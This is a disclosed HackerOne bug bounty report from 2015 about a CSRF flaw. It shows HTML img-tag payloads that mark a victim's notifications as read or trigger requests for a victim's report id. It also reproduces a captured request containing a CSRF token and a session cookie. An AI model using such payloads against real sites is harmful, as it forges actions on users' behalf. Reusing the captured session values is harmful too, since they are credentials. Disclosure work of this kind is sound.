@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/5946
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/redkan
+ReportedTo:HackerOne(security)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:28.04.2015 15:37:35
+
+Summary:
+
+how to make unread notifications read!
+
+<html>
+<img src="https://hackerone.com/notifications/mark_as_read">
+</html>
+
+this happens cause of 
+
+GET https://hackerone.com/notifications/mark_as_read
+
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF-Token: Na8xdZXgeO1e0ftxuD/iLIOalL1xRQj2dCmU8Y+Mt+g=
+X-Requested-With: XMLHttpRequest
+Referer: https://hackerone.com/bugs?team_id=0&sort_type=latest_activity&sort_direction=descending&state=open&limit=25&page=1&substates%5B%5D=new&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=wont-fix&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&user_id=3796
+Cookie: __cfduid=d09855ebf13c356aec9be0483be340bdb1393848505568; session=cXI3bitOSnhUZkxoL0h5cXUxQ0Erbnh4V1RLU3ViMTFiTUdrOFQ0aFN6YkdRbW9vblp4YThPQmhuZmhhaGlsWDdCVjQrd2xQSVZ3UnFCN0hCWWgyUzVRRTVTaThjM0RmWmY0Q2FaRzJlT00xRnVTQ2d5MmZSdUQ3SmN6LzdWSm9vQUhnYTNoU3AwTGhJMXUxMHM1VG11Y1RHVitwVDBRWDlLK282bzdqVFAxUytGemlIZDBSa040Z1pzcE1jSFk2bWJNMUVvdWExRWxKQXU1ZEJWalhXUDIxeU9QcmJaQ1AvVXBxVnNQR3o1eUFmNmZ6Y1E5M05qRkZUV29sdityTmhhSnJXTVNQVitQTm04NkVVejU4Z2lCdG1yb0laYTRDQWRQemRFcDNEVlpVaTdMRDNtUWN5TGFnL1F0RHlGTVBoZFBTcnRhZWdBZVhMNmhMaTZrcHQ3dGVSQ3RWNmorVFVtaWZTdmNLSVNGTVBpNENNVmNpZDZPODJyRkRQZU84YVZVaGZRRnJqZDZJUnJJamNUUnBmZGtEUWJ5aEIreFlZbUlqQ01peW9tZWhtZWFPd2FzemJVczVlTGo3RmZSRFRoUUJLOEZtTVp0OXpRSWJ3Zkc0R1l4dUc2ZEMwZWJxaEczM2tXU3V3RjdFem1lUEVyZHR1U2VSSlFHRXgwZXg5ald4V1ZFUXk4a21VbjNMcG9DQkYrWENMTkI2YTM5L2RraXlreS9oNUdFRjhuaG1EUGp2Um81L3JFU3hWV0Uxb1YxUy9kTUJRK3pTUnlDaGNCd01FcGpHNWpXSnBhZVU4YXh1M1VKdlQrRDIvVUE0RUVIZEk2a295YUJhSzFQY2s3K0w0NDVGVENFekpWZzV5RzV3ZHc9PS0tZnZoZ282b1pLSHorbkZhOSszT3pBUT09--6c21f21340f74a1b2badef42f92c0de2973c77b2; request_method=GET
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+
+
+how to make a particular request
+
+<html>
+<img src="https://hackerone.com/reports/5315">
+</html>
+
+
+replace 5315 with victims report id
